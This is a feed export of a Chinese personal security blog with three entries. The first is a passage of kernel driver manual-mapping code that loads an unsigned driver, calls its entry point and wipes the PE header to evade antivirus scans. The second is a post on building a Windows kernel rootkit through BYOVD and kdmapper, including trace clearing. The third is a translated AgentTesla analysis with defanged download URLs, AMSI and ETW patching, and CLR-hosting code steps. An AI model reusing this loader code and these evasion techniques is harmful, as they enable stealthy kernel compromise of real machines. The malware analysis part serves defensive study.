class="line">moduleBase = ModuleInfo-&gt;ImageBase;</span><br><span class="line"><span class="comment">//如果我们传进来的moduleSize不为空，那么也将size返回</span></span><br><span class="line"><span class="keyword">if</span> (moduleSize) *moduleSize = ModuleInfo-&gt;ImageSize;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//我们传进来的ModuleName转大写后的结果。</span></span><br><span class="line"><span class="comment">//复制一块内存，用来将传进来的常量`FullPathName`转大写,+1会正好有一个0结尾</span></span><br><span class="line">KernelModuleName = ExAllocatePool(PagedPool, <span class="built_in">strlen</span>(moduleName) + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//初始化内存</span></span><br><span class="line"><span class="built_in">memset</span>(KernelModuleName, <span class="number">0</span>, <span class="built_in">strlen</span>(moduleName) + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//复制,将我们传进来的常量`moduleName`拷贝到我们申请出来的KernelModuleName里面</span></span><br><span class="line"><span class="built_in">memcpy</span>(KernelModuleName, moduleName, <span class="built_in">strlen</span>(moduleName));</span><br><span class="line"><span class="comment">//将名字转大写</span></span><br><span class="line">_strupr(KernelModuleName);</span><br><span class="line"><span class="comment">//根据模块的数量遍历</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SystemModules-&gt;NumberOfModules; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将当前遍历到的模块存储在ModuleInfo中</span></span><br><span class="line">PRTL_PROCESS_MODULE_INFORMATION ModuleInfo = &amp;SystemModules-&gt;Modules[i];</span><br><span class="line"><span class="comment">//做测试，打印所有模块</span></span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line">DbgPrint(<span class="string">&quot;baseName = %s;FullPath = %s\r\n&quot;</span>, ModuleInfo-&gt;FullPathName + ModuleInfo-&gt;OffsetToFileName, ModuleInfo-&gt;FullPathName);</span><br><span class="line"><span class="comment">//将FullPathName转换为大写,这里获得的是全路径</span></span><br><span class="line">PUCHAR pathName = _strupr(ModuleInfo-&gt;FullPathName);</span><br><span class="line"><span class="comment">//如果找到了（我们传进来的不完整名字被全路径包含了）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(pathName, KernelModuleName))</span><br><span class="line">&#123;</span><br><span class="line">moduleBase = ModuleInfo-&gt;ImageBase;</span><br><span class="line"><span class="comment">//如果我们传进来的moduleSize不为空，那么也将size返回</span></span><br><span class="line"><span class="keyword">if</span> (moduleSize) *moduleSize = ModuleInfo-&gt;ImageSize;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果不为空，那么释放</span></span><br><span class="line"><span class="keyword">if</span> (KernelModuleName)</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(KernelModuleName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据我们定的标志，判断我们是否申请了内存，如果申请了，进行释放</span></span><br><span class="line"><span class="keyword">if</span> (isAlloc)</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(SystemModules);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将我们得到的指定的模块基址返回</span></span><br><span class="line"><span class="keyword">return</span> moduleBase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//根据函数名找到对应的地址，在win7下RtlFindExportedRoutineByName不可以使用，所以需要重写</span></span><br><span class="line">ULONG64 <span class="title function_">ExportTableFuncByName</span><span class="params">(<span class="type">char</span>* pData, <span class="type">char</span>* funcName)</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pHead = (PIMAGE_DOS_HEADER)pData;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pData + pHead-&gt;e_lfanew);</span><br><span class="line"><span class="type">int</span> numberRvaAndSize = pNt-&gt;OptionalHeader.NumberOfRvaAndSizes;</span><br><span class="line">PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)&amp;pNt-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pData + pDir-&gt;VirtualAddress);</span><br><span class="line"></span><br><span class="line">ULONG64 funcAddr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pExport-&gt;NumberOfNames; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span>* funcAddress = pData + pExport-&gt;AddressOfFunctions;</span><br><span class="line"><span class="type">int</span>* names = pData + pExport-&gt;AddressOfNames;</span><br><span class="line"><span class="type">short</span>* fh = pData + pExport-&gt;AddressOfNameOrdinals;</span><br><span class="line"><span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line"><span class="type">char</span>* name = pData + names[i];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, funcName) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">index = fh[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">funcAddr = pData + funcAddress[index];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!funcAddr)</span><br><span class="line">&#123;</span><br><span class="line">KdPrint((<span class="string">&quot;没有找到函数%s\r\n&quot;</span>, funcName));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">KdPrint((<span class="string">&quot;找到函数%s addr %p\r\n&quot;</span>, funcName, funcAddr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> funcAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于本人的精力大部分不在这个部分，所以只放出代码，其实很简单，仔细看代码即可。就是程序需要使用别人的函数，都放在导入表里，现在我们要把程序放到内存里，那么我们就要给他把导入表里面函数的地址都找到了，上面修复重定位也是一个道理，就是本来是Windows操作系统为我们做的事情，现在我们内存加载要自己实现。</p><h2 id="修复cookie"><a href="#修复cookie" class="headerlink" title="修复cookie"></a>修复cookie</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修复cookie</span></span><br><span class="line">VOID <span class="title function_">UpdataCookie</span><span class="params">(<span class="type">char</span>* ImageBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line"><span class="keyword">if</span> (!ImageBuffer) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//获取PE的NT头，这里使用未文档化的函数进行获取</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = RtlImageNtHeader(ImageBuffer);</span><br><span class="line"><span class="comment">//如果没有获取到，返回FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!pNts) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//第十号(IMAGE_DIRECTORY_ENTRY_BASERELOC)就是cookie</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pConfigDir = &amp;pNts-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];</span><br><span class="line"><span class="comment">//imagebuffer +offset  = config位置</span></span><br><span class="line">PIMAGE_LOAD_CONFIG_DIRECTORY config = (PIMAGE_LOAD_CONFIG_DIRECTORY)(ImageBuffer + pConfigDir-&gt;VirtualAddress);</span><br><span class="line"><span class="comment">//COOKIE 随便一个值就行只要不是危险值，具体就看理论篇有提到cookie的逻辑</span></span><br><span class="line">*(PULONG_PTR)(config-&gt;SecurityCookie) += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="获取入口点-call-入口点"><a href="#获取入口点-call-入口点" class="headerlink" title="获取入口点+call 入口点"></a>获取入口点+call 入口点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载驱动</span></span><br><span class="line">BOOLEAN <span class="title function_">LoadDriver</span><span class="params">(PUCHAR FileBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1.先拉伸，修复PE头，获取PE基址</span></span><br><span class="line">PUCHAR imageBase = FileToImange(FileBuffer);</span><br><span class="line"><span class="comment">//拉伸失败返回FALSE</span></span><br><span class="line"><span class="keyword">if</span> (!imageBase) <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//标志位</span></span><br><span class="line">BOOLEAN isSucess = FALSE;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.根据PE基址修复重定位</span></span><br><span class="line">isSucess = UpdataRelocation(imageBase);</span><br><span class="line"><span class="comment">//失败释放内存</span></span><br><span class="line"><span class="keyword">if</span> (!isSucess) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.根据PE基址修复IAT表</span></span><br><span class="line">isSucess = UpdataIAT(imageBase);</span><br><span class="line"><span class="comment">//失败释放内存</span></span><br><span class="line"><span class="keyword">if</span> (!isSucess) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.修复cookie（Win732位下可以不修）</span></span><br><span class="line">UpdataCookie(imageBase);</span><br><span class="line"></span><br><span class="line"><span class="comment">//call 入口点</span></span><br><span class="line"><span class="comment">//获取PE的NT头，这里使用未文档化的函数进行获取</span></span><br><span class="line">PIMAGE_NT_HEADERS pNts = RtlImageNtHeader(imageBase);</span><br><span class="line"><span class="comment">//5.获取入口点</span></span><br><span class="line">ULONG_PTR entry = pNts-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="comment">//定义一个函数入口点的位置(设置这个函数的地址)</span></span><br><span class="line">DriverEntrypProc EntryPoint = (DriverEntrypProc)(imageBase + entry);</span><br><span class="line"><span class="comment">//6.call 入口点</span></span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line">NTSTATUS status = EntryPoint(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">isSucess = FALSE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将PE头去掉</span></span><br><span class="line"><span class="built_in">memset</span>(imageBase, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isSucess)</span><br><span class="line">&#123;</span><br><span class="line">ExFreePool(imageBase);</span><br><span class="line"><span class="keyword">return</span> isSucess;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> isSucess;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意最下面有一个擦去PE头的操作，因为PE头的使命已完成，去掉这部分可以减少杀毒静态扫描内存的特征，驱动代码和数据已按PE头的描述正确加载到内存中，后续执行完全依赖内存中的代码逻辑，不再读取PE头信息。</p><p>大概就是这么一个操作，大部分参考的如下代码，整理好我放网盘了。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830025601477.png" alt="image-20250830025601477"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830030240810.png" alt="image-20250830030240810"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="正常加载"><a href="#正常加载" class="headerlink" title="正常加载"></a>正常加载</h3><p>不成功</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830031250712.png" alt="image-20250830031250712"></p><h3 id="驱动内存加载"><a href="#驱动内存加载" class="headerlink" title="驱动内存加载"></a>驱动内存加载</h3><p>同样是没有测试环境下的，用编译的驱动加载驱动还是不行的，哈哈哈哈。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830031716271.png" alt="image-20250830031716271"></p><p>测试环境下没毛病啊，所以下一步我们要做的就是，怎么不在测试环境下，也就是要用到BYOVD技术了。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830031902902.png" alt="image-20250830031902902"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/murkuo/p/18199526">https://www.cnblogs.com/murkuo/p/18199526</a></p><p><a href="https://www.cnblogs.com/murkuo/p/18199524">https://www.cnblogs.com/murkuo/p/18199524</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在做恶意驱动开发的时候，想要rootkit，最重要的问题就是驱动能不能加载进去，驱动开发好了，没有签名无法加载使用也是没用，所以我们可以使用</summary>
      
    
    
    
    <category term="Windows Kernel安全研究" scheme="https://250wuyifan.github.io/categories/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="Windows Kernel安全研究" scheme="https://250wuyifan.github.io/tags/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>制作一个Windows x64 Kernel Rootkit</title>
    <link href="https://250wuyifan.github.io/2025/08/28/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAWindows-x64-Kernel-Rootkit/"/>
    <id>https://250wuyifan.github.io/2025/08/28/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AAWindows-x64-Kernel-Rootkit/</id>
    <published>2025-08-28T10:45:14.000Z</published>
    <updated>2025-08-30T09:28:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="rootkit简介"><a href="#rootkit简介" class="headerlink" title="rootkit简介"></a>rootkit简介</h2><p>Rootkit 是最隐蔽的恶意软件之一。与试图传播或破坏数据的传统病毒或蠕虫不同，Rootkit 的设计主要目标是规避检测。它们会深深嵌入操作系统，以隐藏自身以及其他恶意软件的存在。这种不被发现的能力使得 Rootkit 格外危险，因为它们可以在系统中长期驻留，收集敏感信息或进行未经授权的访问，而不会触发常见的安全警报。</p><p>详细可以参考如下网站<a href="https://medium.com/aardvark-infinity/understanding-rootkits-a-stealthy-threat-d2287d4ba313">https://medium.com/aardvark-infinity/understanding-rootkits-a-stealthy-threat-d2287d4ba313</a></p><p>这篇文章主要针对于内核层怎么做rootkit，就是加载驱动，通信驱动做一些操作。</p><h2 id="驱动加载"><a href="#驱动加载" class="headerlink" title="驱动加载"></a>驱动加载</h2><p>开发 rootkit 或攻击性驱动程序，您很可能会将其加载到启用了测试签名的开发计算机上。然而，在实际场景中，尤其是在您可能需要部署 rootkit 的环境中，在目标计算机上启用测试签名通常并非最佳选择。如果您没有有效证书，或者想要使用泄露的证书来签名驱动程序，则必须手动映射驱动程序才能将其加载到目标计算机上。</p><p>对于熟悉用户空间恶意软件的人来说，手动映射驱动程序的概念类似于反射式 PE 加载——您不是从磁盘加载程序，而是手动将其映像布局到内存中。然而，驱动程序必须映射到内核内存，这意味着我们必须在 Ring 0 中已经拥有某种写入原语。这正是 BYOVD 和<a href="https://loldrivers.io/">LOLDrivers</a>发挥作用的地方——如果我们能够利用已签名但易受攻击的驱动程序将任意数据写入内核空间，我们就可以像合法加载一样将 rootkit 驱动程序的映像写入内存。</p><h3 id="使用-kdmapper-手动映射驱动程序"><a href="#使用-kdmapper-手动映射驱动程序" class="headerlink" title="使用 kdmapper 手动映射驱动程序"></a>使用 kdmapper 手动映射驱动程序</h3><p>最著名的将驱动程序映射到内存的工具是<a href="https://github.com/TheCruZ/kdmapper">kdmapper</a>，它利用<code>iqvw64e.sys</code>英特尔的一个易受攻击的驱动程序将任意驱动程序写入内核。当然，这个 loldriver 在某些环境下会被列入黑名单。不过，你可以用任何其他易受攻击的驱动程序（最好是只有你的红队知道的驱动程序）替换内存原语，并且仍然可以使用 kdmapper 来部署你的 rootkit。</p><p>正如我上面描述的，手动映射的过程与反射式 PE 注入非常相似，因为最终，驱动程序只不过是另一个 PE。例如，将节写入内存，解析导入并应用重定位，擦除映像头以实现隐身，最终调用驱动程序的入口点。</p><p>除了这个映射过程之外，kdmapper 还负责清除正在加载的英特尔驱动程序的痕迹。本文的目的并非描述这一点，因为这是映射器而不是 rootkit 应该处理的事情，但它涉及清除各种未记录的数据结构中的条目，例如<a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/324665-clearing-piddbcachetable.html">PiDDBCacheTable</a>、<a href="https://revers.engineering/hiding-drivers-on-windows-10/">MmUnloadedDrivers</a>数组、<a href="https://www.informit.com/articles/article.aspx?p=22443&seqNum=7">g_KernelHashBucketList</a>以及<code>RuntimeDriver*</code>Defender 驱动 <code>WdFilter.sys</code> <a href="https://n4r1b.netlify.app/posts/2020/03/dissecting-the-windows-defender-driver-wdfilter-part-3/">程序</a>使用的结构体。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250828185914197.png" alt="image-20250828185914197"></p><p>正常加载没有签名的驱动提示如下。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250829224142241.png" alt="image-20250829224142241"></p><p>使用内存加载<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250829224313680.png" alt="image-20250829224313680"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250829224352977.png" alt="image-20250829224352977"></p><p>内存加载的知识可以看另一篇文章</p><p><a href="https://250wuyifan.github.io/2025/08/29/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8/">内存加载驱动 | CHANGMEN’个人博客</a></p><p><a href="https://250wuyifan.github.io/2025/08/30/kdmapper%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/">kdmapper内存加载代码快速解析 | CHANGMEN’个人博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;rootkit简介&quot;&gt;&lt;a href=&quot;#rootkit简介&quot; class=&quot;headerlink&quot; title=&quot;rootkit简介&quot;&gt;&lt;/a&gt;rootkit简介&lt;/h2&gt;&lt;p&gt;Rootkit 是最隐蔽的恶意软件之一。与试图传播或破坏数据的传统病毒或蠕虫不同，R</summary>
      
    
    
    
    <category term="Windows Kernel安全研究" scheme="https://250wuyifan.github.io/categories/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="Windows Kernel安全研究" scheme="https://250wuyifan.github.io/tags/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>AgentTesla使用的本机进程CLR 托管分析</title>
    <link href="https://250wuyifan.github.io/2025/08/22/AgentTesla%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%AC%E6%9C%BA%E8%BF%9B%E7%A8%8BCLR-%E6%89%98%E7%AE%A1%E5%88%86%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/22/AgentTesla%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%AC%E6%9C%BA%E8%BF%9B%E7%A8%8BCLR-%E6%89%98%E7%AE%A1%E5%88%86%E6%9E%90/</id>
    <published>2025-08-22T07:53:47.000Z</published>
    <updated>2025-08-23T04:03:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>SonicWall Capture Labs 威胁研究团队在本机 64 位进程中观察到无文件 .Net 托管代码注入。本机代码或非托管代码是指 C&#x2F;C++ 等低级编译代码。托管代码是指针对 .NET 编写的代码，如果没有 CLR（Microsoft .NET 引擎）运行时库，则无法运行。注入的代码属于 AgentTesla 恶意软件。</p><h1 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h1><p>初始感染媒介是客户端以电子邮件附件形式收到的Word文档。打开此文档后，它会要求用户启用VBA宏。如果启用，此VBA宏会从互联网下载并执行一个64位可执行文件。</p><p>下载的二进制文件是一个 64 位 Rust 编译的二进制文件。我们将重点关注该二进制文件所使用的技术，即利用 CLR Hosting 将恶意 AgentTesla 有效载荷注入其自身的进程内存。</p><p>以下是下载的64位可执行文件的详细信息。</p><p>MD5：4521162D45EFC83FA76C4B5C0D405265</p><p>SHA256：F00ED06A1D402ECF760EC92F3280EF6C09E76036854ABACADCAC9311706ED97D</p><p>下载 64 位可执行文件的 URL：</p><p>https[:]&#x2F;&#x2F;New-Coder[.]cc&#x2F;Users&#x2F;signed_20240329011751156[.]exe</p><h1 id="禁用-Windows-事件跟踪-ETW"><a href="#禁用-Windows-事件跟踪-ETW" class="headerlink" title="禁用 Windows 事件跟踪 (ETW)"></a>禁用 Windows 事件跟踪 (ETW)</h1><p>在执行 Rust 二进制文件时，它使用 NtProtectVirtualMemory、WriteProcessMemory 和 FlushInstructionCache API 修补来自 NTDLL 的“EtwEventWrite”API。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-1-after-malware-patches-the-EtwEventWrite-API.png" alt="Figure-1-after-malware-patches-the-EtwEventWrite-API"></p><p>图 1：恶意软件修补“EtwEventWrite”API 后</p><p>该 64 位恶意软件进程从以下 URL 下载包含 AgenetTesla 有效负载的编码 shellcode。</p><p>Shellcode的URL：</p><p>https[:]&#x2F;&#x2F;New-Coder[.]cc&#x2F;Users&#x2F;shellcodeAny_20240329011339585[.]bin</p><p>接下来，恶意软件使用“EnumSystemLocalesA”API 开始执行下载的 shellcode，并将 shellcode 的地址作为回调函数参数传递给 API。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-2-moved-shellcode-from-read-write-memory-to-executable-memory-and-starts-its-execution-1030x496.png" alt="img"></p><p>图 2 **：**将 shellcode 从读写内存移动到可执行内存并开始执行</p><p>Shellcode 解析 PEB 和 PEB_LDR_DATA 来动态解析 API。它将使用 API 哈希技术来解析 VirtualAlloc、VirtualFree 和 RtlExitUserProcess API。</p><p>接下来，shellcode 使用“VirtualAlloc” API 分配读写内存，并将 0x3E3C0 字节从 shellcode 移动到分配的内存中。这些字节就是编码后的 AgentTesla Payload。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-3-moved-shellcode-data-in-read-write-memory-and-started-decryption-routine-1030x500.png" alt="img"></p><p>图 3：将 Shellcode 数据移动到读写内存中并启动解密例程</p><p>如上图3所示，前4个字节（DWORD）是编码数据的大小，后面跟着编码数据。</p><p>接下来，它会解密有效载荷。Shellcode 使用自定义的解密例程，循环执行单字节异或解密，每次迭代都使用 0x10 字节的加密密钥解密有效载荷中的 0x10 字节。在解密循环中，恶意软件每次都会使用由异或和算术运算组合得出的不同加密密钥。它会解密内存缓冲区中的 0x3E184 字节，以获取最终的有效载荷。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-4-Single-byte-XOR-decryption-1030x287.png" alt="img"></p><p>图4：单字节XOR解密</p><p>接下来，shellcode 读取 DLL 名称数组，该数组包含恶意软件执行操作所需的 DLL 名称。该数组为“ole32;oleaut32;wininet;mscoree;shell32”。</p><p>Shellcode 解析 PEB 结构以检查已加载模块列表中是否存在上述 DLL，如果不存在，则使用“LoadLibraryA”API 加载 DLL。</p><p>一旦所需的 DLL 被加载到内存中，它就会使用 API 哈希技术解析更多 API，例如“VirtualProtect”、“SafeArrayCreate”、“CLRCreateInstance”等。</p><h1 id="使用内存修补来绕过-AMSI"><a href="#使用内存修补来绕过-AMSI" class="headerlink" title="使用内存修补来绕过 AMSI"></a>使用内存修补来绕过 AMSI</h1><p>接下来，shellcode 修补“AmsiScanBuffer”和“AmsiScanString”API，如下所示。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/Figure-5-AmsiScanBuffer-API-after-patching-1030x254.png" alt="img"></p><p>图 5：修补后的“AmsiScanBuffer” API</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250823120042256.png" alt="image-20250823120042256"></p><p>图 6：修补后的“AmsiScanString” API</p><p><strong>禁用事件跟踪（第二次）</strong></p><p>我们观察到shellcode中第二次修补是为了禁用事件跟踪，这可能是为了确认修补仍在继续。它使用一个字节“0xCC”（返回指令）修补了“EtwEventWrite”API。</p><p>接下来，shellcode 开始 CLR 托管。</p><p>以下是执行 CLR Hosting 所需的步骤，顺序如下：</p><h1 id="CLR-Hosting"><a href="#CLR-Hosting" class="headerlink" title="CLR Hosting"></a>CLR Hosting</h1><h2 id="创建-CLR-MetaHost-实例："><a href="#创建-CLR-MetaHost-实例：" class="headerlink" title="创建 CLR MetaHost 实例："></a>创建 CLR MetaHost 实例：</h2><p>ICLRMetaHost* pMetaHost &#x3D; NULL;</p><p>CLRCreateInstance（CLSID_CLRMetaHost，IID_ICLRMetaHost，（LPVOID *）＆pMetaHost）;</p><h2 id="枚举已安装的运行时："><a href="#枚举已安装的运行时：" class="headerlink" title="枚举已安装的运行时："></a>枚举已安装的运行时：</h2><p>pMetaHost-&gt;枚举已安装的运行时间（&amp;已安装的运行时间）；</p><p>通过运行时进行枚举并尝试找到系统上安装的特定 dotnet 版本。</p><p>必须使用 ICLRRuntimeInfo 接口中的“GetVersionString”方法来查找支持的 .NET Framework 版本。此 .NET Framework 版本字符串将传递给 GetRuntime API。</p><h2 id="使用“GetRuntime”获取-RuntimeInfo："><a href="#使用“GetRuntime”获取-RuntimeInfo：" class="headerlink" title="使用“GetRuntime”获取 RuntimeInfo："></a>使用“GetRuntime”获取 RuntimeInfo：</h2><p>ICLRRuntimeInfo* 运行时信息 &#x3D; NULL;</p><p>pMetaHost-&gt;GetRuntime(sz_runtimeVersion, IID_ICLRRuntimeInfo, (LPVOID*)&amp;runtimeInfo);</p><h2 id="获取ICorRuntimeHost接口："><a href="#获取ICorRuntimeHost接口：" class="headerlink" title="获取ICorRuntimeHost接口："></a>获取ICorRuntimeHost接口：</h2><p>ICorRuntimeHost 接口允许从本机代码对托管运行时进行更多控制，可以使用 ICLRRuntimeInfo::GetInterface 进行检索</p><p>ICorRuntimeHost* pCorRuntimeHost &#x3D;NULL;</p><p>runtimeInfo-&gt;GetInterface(CLSID_CorRuntimeHost,IID_ICorRuntimeHost,(LPVOID*)&amp; pCorRuntimeHost);</p><h2 id="检索当前进程的默认-AppDomain："><a href="#检索当前进程的默认-AppDomain：" class="headerlink" title="检索当前进程的默认 AppDomain："></a>检索当前进程的默认 AppDomain：</h2><p>ICorRuntimeHost 接口允许检索当前进程的默认 AppDomain。</p><p>IUnknown* appDomainThunk；</p><p>pCorRuntimeHost-&gt;获取默认域（&amp;appDomainThunk）；</p><p>_AppDomain* 默认AppDomain &#x3D; NULL;</p><p>appDomainThunk-&gt;QueryInterface(IID_AppDomain，&amp;defaultAppDomain);</p><h2 id="创建-SafeArray："><a href="#创建-SafeArray：" class="headerlink" title="创建 SafeArray："></a>创建 SafeArray：</h2><p>我们必须创建 SafeArray 并将 MSIL 有效负载复制到此 SafeArray，因为我们无法向将程序集加载到应用程序域的“Load_3”方法提供非托管字节数组。</p><p>SAFEARRAYBOUND 边界；</p><p>bounds.cElements &#x3D; sizeof (rawAssemblyByteArray);</p><p>边界.lLbound &#x3D; 0;</p><p>SAFEARRAY* safeArray &#x3D; SafeArrayCreate(VT_UI1, 1, bounds);</p><p>SafeArrayLock（安全数组）；</p><p>memcpy(safeArray-&gt;pvData，rawAssemblyByteArray，sizeof(rawAssemblyByteArray));</p><p>SafeArrayUnlock（安全数组）；</p><h2 